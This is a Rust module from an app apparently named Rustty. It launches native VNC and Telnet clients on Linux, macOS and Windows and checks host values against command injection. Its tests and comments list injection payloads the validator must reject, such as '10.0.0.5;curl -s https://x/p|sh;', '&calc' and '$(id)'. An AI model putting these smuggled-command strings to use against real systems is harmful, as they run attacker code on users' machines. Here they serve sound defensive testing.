//! Lanzadores de clientes externos (VNC, Telnet) al estilo de `rdp_manager`.
//!
//! Rustty no embebe estos protocolos: lanza el cliente nativo del sistema en una
//! ventana aparte y vigila su proceso, emitiendo un evento de cierre por sesión
//! cuando termina. El ciclo de vida (lanzar / vigilar / desconectar) es común a
//! VNC y Telnet, así que vive en `ExternalClientManager`; cada protocolo aporta
//! solo su `spawn_*` por plataforma y su `EventKind`.

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use tauri::{AppHandle, Emitter};

use crate::ipc::{event_name, EventKind};
use crate::locks::MutexExt;

/// Sesión de cliente externo activa.
pub struct ExternalHandle {
    pub child: std::process::Child,
    pub cleanup_path: Option<PathBuf>,
    #[allow(dead_code)]
    pub profile_id: String,
}

/// Resultado de lanzar el cliente: el proceso y un fichero temporal a limpiar.
pub struct SpawnedExternalClient {
    pub child: std::process::Child,
    pub cleanup_path: Option<PathBuf>,
}

/// Gestor genérico de clientes externos. Vigila cada proceso en un hilo y emite
/// `closed_event` (por sesión) cuando termina.
struct ExternalClientManager {
    sessions: Arc<Mutex<HashMap<String, ExternalHandle>>>,
}

impl ExternalClientManager {
    fn new() -> Self {
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn launch(
        &self,
        session_id: String,
        profile_id: String,
        closed_event: EventKind,
        spawned: SpawnedExternalClient,
        app_handle: AppHandle,
    ) -> Result<(), String> {
        self.sessions.lock_recover().insert(
            session_id.clone(),
            ExternalHandle {
                child: spawned.child,
                cleanup_path: spawned.cleanup_path,
                profile_id,
            },
        );

        // Hilo vigilante: detecta cuándo el proceso externo termina.
        let sessions = Arc::clone(&self.sessions);
        let sid = session_id.clone();
        std::thread::spawn(move || loop {
            std::thread::sleep(std::time::Duration::from_millis(500));

            let finished = {
                let mut map = sessions.lock_recover();
                if let Some(handle) = map.get_mut(&sid) {
                    match handle.child.try_wait() {
                        Ok(Some(_)) | Err(_) => {
                            let handle = map.remove(&sid);
                            if let Some(path) = handle.and_then(|h| h.cleanup_path) {
                                let _ = std::fs::remove_file(path);
                            }
                            true
                        }
                        Ok(None) => false,
                    }
                } else {
                    break; // La sesión fue eliminada por *_disconnect.
                }
            };

            if finished {
                let _ = app_handle.emit(&event_name(closed_event, &sid), ());
                break;
            }
        });

        Ok(())
    }

    fn disconnect(&self, session_id: &str) {
        if let Some(mut handle) = self.sessions.lock_recover().remove(session_id) {
            let _ = handle.child.kill();
            if let Some(path) = handle.cleanup_path.take() {
                let _ = std::fs::remove_file(path);
            }
        }
    }

    fn disconnect_all(&self) {
        let handles: Vec<_> = self
            .sessions
            .lock_recover()
            .drain()
            .map(|(_, h)| h)
            .collect();
        for mut handle in handles {
            let _ = handle.child.kill();
            if let Some(path) = handle.cleanup_path.take() {
                let _ = std::fs::remove_file(path);
            }
        }
    }
}

// ─── VNC ──────────────────────────────────────────────────────────────────────

/// Gestor de sesiones VNC (visor externo del sistema).
pub struct VncManager(ExternalClientManager);

impl VncManager {
    pub fn new() -> Self {
        Self(ExternalClientManager::new())
    }

    pub fn launch(
        &self,
        session_id: String,
        profile_id: String,
        host: &str,
        port: u16,
        app_handle: AppHandle,
    ) -> Result<(), String> {
        check_launch_host(host)?;
        let spawned = spawn_vnc_client(host, port)?;
        self.0.launch(
            session_id,
            profile_id,
            EventKind::VncClosed,
            spawned,
            app_handle,
        )
    }

    pub fn disconnect(&self, session_id: &str) -> Result<(), String> {
        self.0.disconnect(session_id);
        Ok(())
    }

    pub fn disconnect_all(&self) {
        self.0.disconnect_all();
    }
}

// ─── Telnet ───────────────────────────────────────────────────────────────────

/// Gestor de sesiones Telnet (cliente externo dentro de un emulador de terminal).
pub struct TelnetManager(ExternalClientManager);

impl TelnetManager {
    pub fn new() -> Self {
        Self(ExternalClientManager::new())
    }

    pub fn launch(
        &self,
        session_id: String,
        profile_id: String,
        host: &str,
        port: u16,
        app_handle: AppHandle,
    ) -> Result<(), String> {
        check_launch_host(host)?;
        let spawned = spawn_telnet_client(host, port)?;
        self.0.launch(
            session_id,
            profile_id,
            EventKind::TelnetClosed,
            spawned,
            app_handle,
        )
    }

    pub fn disconnect(&self, session_id: &str) -> Result<(), String> {
        self.0.disconnect(session_id);
        Ok(())
    }

    pub fn disconnect_all(&self) {
        self.0.disconnect_all();
    }
}

// ─── Spawners VNC por plataforma ──────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn spawn_vnc_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    let binary = ["xtigervncviewer", "tigervnc", "vncviewer", "xvncviewer"]
        .iter()
        .find(|&&bin| which_exists(bin))
        .copied()
        .ok_or_else(|| {
            "Visor VNC no encontrado. Instala TigerVNC:\n  sudo dnf install tigervnc  # Fedora\n  sudo apt install tigervnc-viewer  # Debian/Ubuntu".to_string()
        })?;

    // `host::port` (doble dos puntos) indica puerto TCP literal en TigerVNC.
    let child = crate::sandbox::host_command(binary, crate::sandbox::HostSpawn::default())
        .arg(format!("{host}::{port}"))
        .spawn()
        .map_err(|e| format!("Error al lanzar {binary}: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

#[cfg(target_os = "macos")]
fn spawn_vnc_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    // Screen Sharing nativo abre las URL vnc://.
    let child = std::process::Command::new("open")
        .arg(format!("vnc://{host}:{port}"))
        .spawn()
        .map_err(|e| format!("Error al abrir el visor VNC: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

#[cfg(target_os = "windows")]
fn spawn_vnc_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    // Buscar un vncviewer.exe conocido; si no, dejar que el shell resuelva vnc://.
    if let Some(viewer) = resolve_windows_exe(&["vncviewer.exe", "tvnviewer.exe"]) {
        if let Ok(child) = std::process::Command::new(&viewer)
            .arg(format!("{host}:{port}"))
            .spawn()
        {
            return Ok(SpawnedExternalClient {
                child,
                cleanup_path: None,
            });
        }
    }
    use std::os::windows::process::CommandExt;
    let child = std::process::Command::new("cmd")
        .raw_arg(cmd_start_line(false, &format!("vnc://{host}:{port}"), &[]))
        .spawn()
        .map_err(|e| format!("Error al abrir vnc://: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

// ─── Spawners Telnet por plataforma ───────────────────────────────────────────

#[cfg(target_os = "linux")]
fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    if !which_exists("telnet") {
        return Err(
            "Cliente telnet no encontrado. Instala telnet:\n  sudo dnf install telnet  # Fedora\n  sudo apt install telnet  # Debian/Ubuntu".to_string(),
        );
    }
    // `telnet` es de línea de comandos: necesita un emulador de terminal anfitrión.
    let term = ["x-terminal-emulator", "gnome-terminal", "konsole", "xfce4-terminal", "alacritty", "kitty", "xterm"]
        .iter()
        .find(|&&bin| which_exists(bin))
        .copied()
        .ok_or_else(|| {
            "No se encontró un emulador de terminal para lanzar telnet (probado: gnome-terminal, konsole, xterm…).".to_string()
        })?;

    let mut cmd = crate::sandbox::host_command(term, crate::sandbox::HostSpawn::default());
    // gnome-terminal moderno separa el comando con `--`; el resto usa `-e`.
    if term == "gnome-terminal" {
        cmd.arg("--").arg("telnet").arg(host).arg(port.to_string());
    } else {
        cmd.arg("-e").arg("telnet").arg(host).arg(port.to_string());
    }
    let child = cmd
        .spawn()
        .map_err(|e| format!("Error al lanzar telnet en {term}: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

#[cfg(target_os = "macos")]
fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    // Abrir Terminal.app ejecutando telnet mediante AppleScript.
    let child = std::process::Command::new("osascript")
        .args(telnet_osascript_args(host, port))
        .spawn()
        .map_err(|e| format!("Error al abrir Terminal para telnet: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

#[cfg(target_os = "windows")]
fn spawn_telnet_client(host: &str, port: u16) -> Result<SpawnedExternalClient, String> {
    use std::os::windows::process::CommandExt;
    let child = std::process::Command::new("cmd")
        .raw_arg(cmd_start_line(false, "telnet", &[host, &port.to_string()]))
        .spawn()
        .map_err(|e| format!("Error al lanzar telnet: {e}"))?;
    Ok(SpawnedExternalClient {
        child,
        cleanup_path: None,
    })
}

// ─── Validación del destino ───────────────────────────────────────────────────

/// Longitud máxima de un host que se entrega a un cliente externo: un nombre
/// DNS no pasa de 253 caracteres y una IPv6 con corchetes y zona cabe de sobra.
const MAX_LAUNCH_HOST_LEN: usize = 255;

/// Comprueba que el host del perfil es un nombre o una dirección y nada más,
/// antes de entregárselo a un cliente externo (VNC, Telnet, RDP).
///
/// El host llega del perfil, y el perfil puede venir de un import o de la
/// sincronización: no es un sitio en el que confiar a ciegas. En Windows
/// algunos caminos pasan por `cmd /C start` y en macOS Telnet se abre con
/// AppleScript en el shell del usuario; un `10.0.0.5&calc` o un `h;curl …|sh`
/// ejecutaría otra orden. Por eso se admite solo una lista cerrada: letras y
/// dígitos (también los de un nombre internacionalizado), `.`, `_`, `-`, `:`
/// (IPv6), `[` `]` (IPv6 entre corchetes) y un único `%` (la zona de una IPv6
/// de enlace local): con un solo `%`, `cmd` no puede formar un `%VAR%`. Un `-`
/// inicial se rechaza porque el cliente lo leería como una opción. Se valida
/// el host ya resuelto, así que un `${…}` sin sustituir tampoco pasa.
pub fn check_launch_host(host: &str) -> Result<(), String> {
    if host.is_empty() {
        return Err("El host de la conexión está vacío.".to_string());
    }
    if host.chars().count() > MAX_LAUNCH_HOST_LEN {
        return Err(format!(
            "El host de la conexión es demasiado largo (más de {MAX_LAUNCH_HOST_LEN} caracteres)."
        ));
    }
    if host.starts_with('-') {
        return Err(format!("Host no válido: {host:?}. No puede empezar por «-»."));
    }
    let allowed =
        |c: char| c.is_alphanumeric() || matches!(c, '.' | '_' | '-' | ':' | '%' | '[' | ']');
    if !host.chars().all(allowed) || host.matches('%').count() > 1 {
        return Err(format!(
            "Host no válido: {host:?}. Solo admite letras, números, «.», «_», «-», «:», «[», «]» y un «%» para la zona de una IPv6."
        ));
    }
    Ok(())
}

// ─── Utilidades ───────────────────────────────────────────────────────────────

/// Argumentos de `osascript` para abrir telnet en Terminal.app. El host y el
/// puerto no se interpolan en el script: viajan como argumentos del manejador
/// `run` y llegan al shell con `quoted form of`, así que el texto del script es
/// siempre el mismo y ningún valor del perfil se interpreta como código.
#[cfg(any(target_os = "macos", test))]
fn telnet_osascript_args(host: &str, port: u16) -> Vec<String> {
    vec![
        "-e".to_string(),
        "on run argv".to_string(),
        "-e".to_string(),
        "tell application \"Terminal\" to do script \"telnet \" & quoted form of item 1 of argv & \" \" & quoted form of item 2 of argv".to_string(),
        "-e".to_string(),
        "end run".to_string(),
        host.to_string(),
        port.to_string(),
    ]
}

/// Línea de órdenes de `cmd` para abrir `target` con `start`: título vacío y
/// destino entre comillas, tal cual (`raw_arg`). Con `.arg("\"\"")` la
/// biblioteca estándar escapa las comillas como `\"\"`, que `start` no toma por
/// el título; y sin comillas, un `&` del destino (el de una URL `rdp://`)
/// partiría la orden en dos. Quien llama garantiza que ni el destino ni los
/// argumentos llevan comillas: el host pasa antes por `check_launch_host`.
#[cfg(any(target_os = "windows", test))]
pub(crate) fn cmd_start_line(wait: bool, target: &str, args: &[&str]) -> String {
    let mut line = String::from("/C start \"\"");
    if wait {
        line.push_str(" /WAIT");
    }
    line.push_str(" \"");
    line.push_str(target);
    line.push('"');
    for arg in args {
        line.push(' ');
        line.push_str(arg);
    }
    line
}

/// Bajo Flatpak la búsqueda va contra el `PATH` del host, que es donde estos
/// visores están instalados y donde se van a ejecutar.
#[cfg(target_os = "linux")]
fn which_exists(bin: &str) -> bool {
    crate::sandbox::host_which(bin)
}

#[cfg(target_os = "windows")]
fn resolve_windows_exe(names: &[&str]) -> Option<PathBuf> {
    let path_var = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path_var) {
        for name in names {
            let candidate = dir.join(name);
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn el_host_acepta_nombres_y_direcciones() {
        for host in [
            "10.0.0.5",
            "server.internal.local",
            "servidor-interno_01.local",
            "servidor-español.local",
            "::1",
            "fe80::1",
            "[::1]",
            "[fe80::1%eth0]",
            "fe80::1%12",
        ] {
            assert!(check_launch_host(host).is_ok(), "debería aceptar {host:?}");
        }
        assert!(check_launch_host(&"a".repeat(MAX_LAUNCH_HOST_LEN)).is_ok());
    }

    #[test]
    fn el_host_rechaza_metacaracteres_de_cmd_sh_y_applescript() {
        for host in [
            "",
            "10.0.0.5&calc",
            "10.0.0.5;curl -s https://x/p|sh;",
            "a;b",
            "a|b",
            "a b",
            "a\tb",
            "h\r\nx",
            "h\n",
            "a^b",
            "a<b",
            "a>b",
            "a\"b",
            "a'b",
            "a`id`",
            "a$(id)",
            "${var:host}",
            "a(b)",
            "a{b}",
            "a!b",
            "a,b",
            "a=b",
            "a/b",
            "a\\b",
            "-oProxyCommand=x",
            "-via",
            "a%PATH%b",
        ] {
            assert!(check_launch_host(host).is_err(), "debería rechazar {host:?}");
        }
        assert!(check_launch_host(&"a".repeat(MAX_LAUNCH_HOST_LEN + 1)).is_err());
    }

    #[test]
    fn telnet_en_macos_pasa_host_y_puerto_fuera_del_script() {
        let args = telnet_osascript_args("10.0.0.5", 2323);
        // El script (lo que sigue a cada `-e`) no lleva ni el host ni el puerto.
        let script: Vec<&str> = args
            .chunks(2)
            .take_while(|par| par[0] == "-e")
            .map(|par| par[1].as_str())
            .collect();
        assert_eq!(script.len(), 3);
        assert!(script
            .iter()
            .all(|linea| !linea.contains("10.0.0.5") && !linea.contains("2323")));
        assert!(script[1].contains("quoted form of item 1 of argv"));
        // Host y puerto van detrás, como argumentos del manejador `run`.
        assert_eq!(&args[args.len() - 2..], ["10.0.0.5", "2323"]);
        assert_eq!(args.len(), 8);
    }

    #[test]
    fn cmd_start_lleva_titulo_vacio_y_destino_entre_comillas() {
        assert_eq!(
            cmd_start_line(false, "telnet", &["10.0.0.5", "23"]),
            r#"/C start "" "telnet" 10.0.0.5 23"#
        );
        assert_eq!(
            cmd_start_line(true, "rdp://full%20address=s:h:3389&username=s:bob", &[]),
            r#"/C start "" /WAIT "rdp://full%20address=s:h:3389&username=s:bob""#
        );
    }
}
